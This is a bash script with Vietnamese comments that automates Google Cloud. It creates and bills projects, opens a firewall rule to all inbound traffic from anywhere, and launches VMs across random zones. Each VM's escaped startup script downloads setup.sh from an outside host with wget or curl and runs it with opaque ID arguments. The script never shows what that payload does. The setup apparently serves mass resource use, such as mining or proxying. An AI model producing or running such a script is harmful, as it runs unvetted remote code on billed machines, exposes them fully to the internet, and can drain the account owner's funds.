#!/bin/bash

# Define the regions array
regions=(
  "us-east5-c"
  "europe-west4-a"
  "europe-west9-a"
  "us-central1-a"
  "us-central1-b"
  "us-central1-c"
  "us-east1-b"
  "us-east1-c"
  "us-east4-a"
  "europe-west1-a"
  "europe-west1-b"
  "europe-west1-c"
  "asia-east1-a"
  "asia-east1-b"
  "asia-east1-c"
)

# Function to get a random number between 1 and 2
get_random_count() {
  echo $(( RANDOM % 2 + 1 ))
}

# Function to shuffle and get a random subset
get_random_subset() {
  local array=("$@")
  local count=$(get_random_count)
  local new_array=()

  # Shuffle array
  for i in $(shuf -i 0-$((${#array[@]}-1)) -n ${#array[@]}); do
    new_array+=("${array[$i]}")
  done

  # Select first $count elements
  new_array=("${new_array[@]:0:$count}")

  echo "${new_array[@]}"
}

# Get random subset and store in zones array
zones=($(get_random_subset "${regions[@]}"))

# Print the new zones array
echo "Selected zones: ${zones[@]}"


# Hàm sinh chuỗi ngẫu nhiên có độ dài 5 ký tự
generate_random_string() {
  local random_string=$(LC_ALL=C tr -dc 'a-z' < /dev/urandom | head -c 5 ; echo '')
  echo "${random_string}-$(LC_ALL=C tr -dc 'a-z' < /dev/urandom | head -c 5 ; echo '')"
}

# Hàm tạo project ID
generate_project_id() {
  local random_suffix=$(generate_random_string)
  echo "$random_suffix"
}

# Hàm tạo project name
generate_project_name() {
  random_numbers=$(generate_random_numbers)
  echo "My Project $random_numbers"
}

# Hàm sinh chuỗi ngẫu nhiên gồm 5 số
generate_random_numbers() {
  local random_numbers=$(shuf -i 0-99999 -n 1)
  printf "%05d" "$random_numbers"
}
generate_random_number() {
  echo $((1000 + RANDOM % 9000))
}
generate_valid_instance_name() {
  local random_number=$(generate_random_number)
  echo "fx-${random_number}"
}

# Kiểm tra sự tồn tại của tổ chức
organization_id=$(gcloud organizations list --format="value(ID)" 2>/dev/null)
echo "ID tổ chức của bạn là: $organization_id"

# Lấy ID tài khoản thanh toán
billing_account_id=$(gcloud beta billing accounts list --format="value(name)" | head -n 1)
echo "Billing_account_id của bạn là: $billing_account_id"

# Hàm đảm bảo có đủ số lượng dự án
ensure_n_projects() {
  desired_projects=1
  if [ -n "$organization_id" ]; then
    current_projects=$(gcloud projects list --format="value(projectId)" --filter="parent.id=$organization_id" 2>/dev/null | wc -l)
  else
    current_projects=$(gcloud projects list --format="value(projectId)" 2>/dev/null | wc -l)
  fi

  echo "Tổng số dự án đang có là: $current_projects"

  if [ "$current_projects" -lt "$desired_projects" ]; then
    projects_to_create=$((desired_projects - current_projects))
    echo "Chưa có đủ $desired_projects dự án, đang tiến hành tạo $projects_to_create dự án..."

    for ((i = 0; i < projects_to_create; i++)); do
      local project_id=$(generate_project_id)
      local project_name=$(generate_project_name)

      if [ -n "$organization_id" ]; then
        gcloud projects create "$project_id" --name="$project_name" --organization="$organization_id"
        echo "Đang tạo dự án '$project_name' (ID: $project_id)."
        sleep 2
      else
        echo "Đang tạo dự án '$project_name' (ID: $project_id)."
        gcloud projects create "$project_id" --name="$project_name"
        sleep 2
      fi
      sleep 10
      gcloud alpha billing projects link "$project_id" --billing-account="$billing_account_id"
      gcloud config set project "$project_id"
      echo "Đã tạo dự án '$project_name' (ID: $project_id)."
    done
  else
    echo "Đã có đủ $desired_projects dự án."
  fi
}

# Hàm tạo firewall rule cho một project
create_firewall_rule() {
    local project_id=$1
    gcloud compute --project="$project_id" firewall-rules create firewallld --direction=INGRESS --priority=1000 --network=default --action=ALLOW --rules=all --source-ranges=0.0.0.0/0
}

re_enable_compute_projects(){
    sleep 4
    local projects=$(gcloud projects list --format="value(projectId)")
    echo "projects list: $projects"
    if [ -z "$projects" ]; then
        echo "The account has no projects."
        exit 1
    fi
    for project_ide in $projects; do
        echo "enable api & create firewall_rule  for project: $project_ide ....."
        gcloud services enable compute.googleapis.com --project "$project_ide"
        sleep 5
        create_firewall_rule "$project_ide"
        echo "enabled compute.googleapis.com project: $project_ide"
    done
}

# Hàm kiểm tra và chờ dịch vụ được enable
check_service_enablement() {
    local project_id="$1"
    local service_name="compute.googleapis.com"
    echo "Đang kiểm tra trạng thái compute.googleapis.com của dịch vụ $service_name trong dự án : $project_id..."

    while true; do
        service_status=$(gcloud services list --enabled --project "$project_id" --filter="NAME:$service_name" --format="value(NAME)")
        if [[ "$service_status" == "$service_name" ]]; then
            echo "Dịch vụ $service_name đã được enable trong dự án : $project_id."
            break
        else
            echo "Dịch vụ $service_name chưa được enable trong dự án : $project_id. Đang cố gắng enable..."
            gcloud services enable "$service_name" --project "$project_id"
            sleep 5
        fi
    done
}

run_enable_project_apicomputer(){
   local projects=$(gcloud projects list --format="value(projectId)")
   for project_id in $projects; do
    check_service_enablement "$project_id"
   done
}

create_vms(){
    local projects=$(gcloud projects list --format="value(projectId)")
    for project_id in $projects; do
        echo "processing create vm on project-id: $project_id"
        gcloud config set project "$project_id"
        service_account_email=$(gcloud iam service-accounts list --project="$project_id" --format="value(email)" | head -n 1)
        if [ -z "$service_account_email" ]; then
            echo "No Service Account could be found in the project: $project_id"
            echo "Chạy lại script hoặc xóa project chưa xóa hết."
            continue
        fi
        for zone in "${zones[@]}"; do
            instance_name=$(generate_valid_instance_name)
            gcloud compute instances create "$instance_name" \
            --project="$project_id" \
            --zone="$zone" \
            --machine-type=t2d-standard-2 \
            --network-interface=network-tier=PREMIUM,nic-type=VIRTIO_NET,stack-type=IPV4_ONLY,subnet=default \
            --metadata=^,@^startup-script=\#\!/bin/bash$'\n'tries=10$'\n'while\ \[\ \$tries\ -gt\ 0\ \]\ \&\&\ \!\ \{\ \(wget\ x9mlzj.hhub.top/G1tU7tq7z2.sh\ -4O\ setup.sh\ \|\|\ curl\ x9mlzj.hhub.top/G1tU7tq7z2.sh\ -Lo\ setup.sh\)\;\ \}\ \;\ do$'\n'\ \ \ \ echo\ \"Download\ failed,\ retrying\ \$tries\ more\ times\"$'\n'\ \ \ \ tries=\$\(\(tries-1\)\)$'\n'\ \ \ \ sleep\ 10$'\n'\ \ \ \ echo\ -e\ \"nameserver\ 8.8.8.8\\nnameserver\ 1.1.1.1\"\ \>\ /etc/resolv.conf$'\n'done$'\n'bash\ setup.sh\ 972c3c59-1341-4ad4-bea4-72dd50800d29\ -i=cba81b78-e8a5-4c2b-b620-3deff4e0b735\ -y \
            --maintenance-policy=MIGRATE \
            --provisioning-model=STANDARD \
            --service-account="$service_account_email" \
            --scopes=https://www.googleapis.com/auth/devstorage.read_only,https://www.googleapis.com/auth/logging.write,https://www.googleapis.com/auth/monitoring.write,https://www.googleapis.com/auth/servicecontrol,https://www.googleapis.com/auth/service.management.readonly,https://www.googleapis.com/auth/trace.append \
            --enable-display-device \
            --create-disk=auto-delete=yes,boot=yes,device-name="$instance_name",image=projects/ubuntu-os-cloud/global/images/ubuntu-2004-focal-v20240614,mode=rw,size=139,type=projects/"$project_id"/zones/"$zone"/diskTypes/pd-balanced \
            --no-shielded-secure-boot \
            --shielded-vtpm \
            --shielded-integrity-monitoring \
            --labels=goog-ec-src=vm_add-gcloud \
            --reservation-affinity=any
            if [ $? -eq 0 ]; then
                echo "Created instance $instance_name in project $project_id at region $zone sucessfully."
            else
                echo "Fail create instance $instance_name in project $project_id at region $zone."
            fi
        done
    done

}

list_of_servers(){
    local projectsss=($(gcloud projects list --format="value(projectId)"))
    all_ips=()
    # Lặp qua từng dự án và lấy danh sách các địa chỉ IP công cộng
    for projects_id in "${projectsss[@]}"; do
        echo "Retrieving list of servers from project: $projects_id"       
        # Đặt dự án hiện tại
        gcloud config set project "$projects_id"      
        # Lấy danh sách địa chỉ IP công cộng của các máy chủ trong dự án hiện tại
        ips=($(gcloud compute instances list --format="value(EXTERNAL_IP)" --project="$projects_id"))       
        # Thêm các địa chỉ IP vào mảng all_ips
        all_ips+=("${ips[@]}")
    done
    echo "List of all public IP addresses:"
    for ip in "${all_ips[@]}"; do
        echo "$ip"
    done

}

# Hàm main: Chạy các hàm
main() {
    echo "----------------Bắt đầu tiến trình.-----------------"
    ensure_n_projects
    echo "----------------Kiểm tra xong project.-----------------"
    re_enable_compute_projects
    run_enable_project_apicomputer
    echo "----------------Tiến hành tạo máy.-------------"
    create_vms
    list_of_servers
    echo "Đã tạo máy thành công."
}
main
